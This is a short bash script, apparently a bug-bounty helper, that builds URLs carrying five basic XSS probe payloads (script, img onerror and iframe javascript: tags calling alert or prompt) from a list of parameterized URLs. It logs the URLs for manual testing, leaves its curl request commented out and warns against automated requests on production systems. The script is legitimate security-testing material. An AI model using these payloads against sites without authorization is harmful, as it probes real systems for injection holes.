#!/bin/bash
# Quick XSS parameter check
# Usage: ./check_xss.sh urls.txt

if [ -z "$1" ]; then
    echo "Usage: ./check_xss.sh <urls.txt>"
    echo "Example: ./check_xss.sh targets/example.com-20240101/urls_with_params.txt"
    exit 1
fi

URLS=$1
PAYLOADS=(
    "\u003cscript\u003ealert(1)\u003c/script\u003e"
    "\u003cimg src=x onerror=alert(1)\u003e"
    "\u003ciframe src=javascript:alert(1)\u003e"
    "'\u003e\u003cscript\u003ealert(1)\u003c/script\u003e"
    "\u003cscript\u003eprompt(1)\u003c/script\u003e"
)

OUTPUT_DIR="reports/xss-check-$(date +%Y%m%d)"
mkdir -p $OUTPUT_DIR

echo "=========================================="
echo "🐛 XSS Parameter Check"
echo "=========================================="
echo "Testing: $URLS"
echo "Output: $OUTPUT_DIR"
echo ""

# Check if file exists
if [ ! -f "$URLS" ]; then
    echo "❌ Error: File not found: $URLS"
    exit 1
fi

# Count URLs
TOTAL=$(wc -l < $URLS)
echo "[*] Testing $TOTAL URLs with XSS payloads"
echo ""

# Test each URL with each payload
COUNTER=0
while read url; do
    COUNTER=$((COUNTER + 1))
    
    # Skip empty lines
    [ -z "$url" ] && continue
    
    # Show progress every 10 URLs
    if [ $((COUNTER % 10)) -eq 0 ]; then
        echo "  Progress: $COUNTER/$TOTAL"
    fi
    
    # Check if URL has parameters
    if echo "$url" | grep -q '?'; then
        for payload in "${PAYLOADS[@]}"; do
            # Create test URL by adding payload to parameters
            # This is a simple check - real testing needs proper encoding
            TEST_URL=$(echo "$url" | sed "s/=.*=/=$payload\u0026/g" 2>/dev/null || echo "$url")
            
            # Log for manual review
            echo "$TEST_URL" >> $OUTPUT_DIR/test_urls.txt
            
            # Optional: Make request (commented out for safety)
            # curl -s "$TEST_URL" -o $OUTPUT_DIR/response_$COUNTER.html
        done
    fi
done < $URLS

echo ""
echo "=========================================="
echo "✅ XSS check complete!"
echo "=========================================="
echo ""
echo "Generated: $OUTPUT_DIR/test_urls.txt"
echo "Total test URLs: $(wc -l < $OUTPUT_DIR/test_urls.txt 2>/dev/null || echo 0)"
echo ""
echo "⚠️  IMPORTANT:"
echo "   These URLs contain XSS payloads for manual testing."
echo "   Review each URL in Burp Suite or browser with caution."
echo "   Do NOT run automated requests against production systems."
echo ""
echo "Next steps:"
echo "  1. Review: cat $OUTPUT_DIR/test_urls.txt"
echo "  2. Test manually with Burp Suite"
echo "  3. Verify reflected/stored XSS"
echo "  4. Document findings in report"
echo ""
